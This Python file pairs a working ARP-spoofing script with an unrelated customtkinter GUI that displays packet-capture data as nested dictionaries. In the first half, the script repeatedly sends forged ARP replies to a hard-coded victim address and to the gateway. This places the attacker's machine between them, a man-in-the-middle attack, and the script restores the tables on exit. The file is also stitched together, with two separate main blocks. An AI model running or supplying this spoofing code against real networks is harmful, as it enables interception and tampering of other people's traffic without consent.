import customtkinter as ctk
import tkinter as tk
from tkinter import ttk
import scapy2


import scapy.all as scapy
#from scapy.all import Ether, ARP, srp, send
import time

import os
import sys


def get_mac1(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
    return answered_list[0][1].hwsrc

def get_mac(ip):
    '''return MAC address of any device connected to the network
    If ip is down return None'''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
    if answered_list:
        return answered_list[0][1].src


def spoof(target_ip, spoof_ip, verbose=True):
    '''
    Spoofs 'target_ip' saying that we are host_ip'''

    packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    if verbose:
        #get the MAC address of the default interface we are using
        self_mac = scapy.ARP().hwsrc  
        print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))




def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst=destination_ip,
            hwdst = destination_mac,
            psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)



if __name__ == "__main__":
    #victom ip address
    target = '192.168.8.137'

    #gateway ip
    host = '192.168.8.243'

    verbose = True


    try:
        while True:
            #Telling the target that we are the host
            spoof(target, host, verbose)

            # Telling the host that we are the target
            spoof(host, target, verbose)

            # sleep for a second
            time.sleep(1)
            
            

    except KeyboardInterrupt:
        print("[!] Detexcted CTRL+C! restoring the network, please wait")

        restore(target, host)
        restore(host, target)
    





# ------------------------------
# Dummy Data
# ------------------------------
DATA = [
    {
        "id": 1,
        "name": "Alpha",
        "status": "OK",
        "info": {
            "voltage": 3.3,
            "current": 0.12,
            "nested": {
                "temp": 25.1,
                "location": "Rack A3"
            }
        }
    },
    {
        "id": 2,
        "name": "Bravo",
        "status": "WARN",
        "info": {
            "voltage": 4.9,
            "current": 0.32
        }
    }
]



# ------------------------------
# Recursive function for adding dicts to a treeview
# ------------------------------
def insert_dict_into_tree(tree, parent, d: dict):
    for key, val in d.items():
        if isinstance(val, dict):
            node = tree.insert(parent, "end", text=key, values=("",))
            insert_dict_into_tree(tree, node, val)
        else:
            tree.insert(parent, "end", text=key, values=(str(val),))


# ------------------------------
# Build GUI
# ------------------------------
def build_gui():
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    root.title("Dict Row Viewer")

    main = ctk.CTkFrame(root)
    main.pack(padx=20, pady=20)

    data_list = scapy2.create_tree_from_selected_pcap()

    # Get all top-level keys (columns)
    all_keys = list(data_list[0].keys())

    # Header row
    for col, k in enumerate(all_keys):
        header = ctk.CTkLabel(main, text=k.upper(), font=("Arial", 14, "bold"))
        header.grid(row=0, column=col, padx=10, pady=5)

    # Data rows
    for r, item in enumerate(data_list, start=1):
        for c, k in enumerate(all_keys):
            if k != "info":
                # Normal columns
                val = item.get(k, "")
                lbl = ctk.CTkLabel(main, text=str(val))
                lbl.grid(row=r, column=c, padx=10, pady=5)
            else:
                # Create a mini treeview
                frame = ctk.CTkFrame(main, fg_color="transparent")
                frame.grid(row=r, column=c, padx=10, pady=5)

                tree = ttk.Treeview(frame, height=4, columns=("val",))
                tree.heading("#0", text="Key")
                tree.heading("val", text="Value")
                tree.column("val", width=100)

                tree.pack()

                insert_dict_into_tree(tree, "", item["info"])

    root.mainloop()


if __name__ == "__main__":
    build_gui()
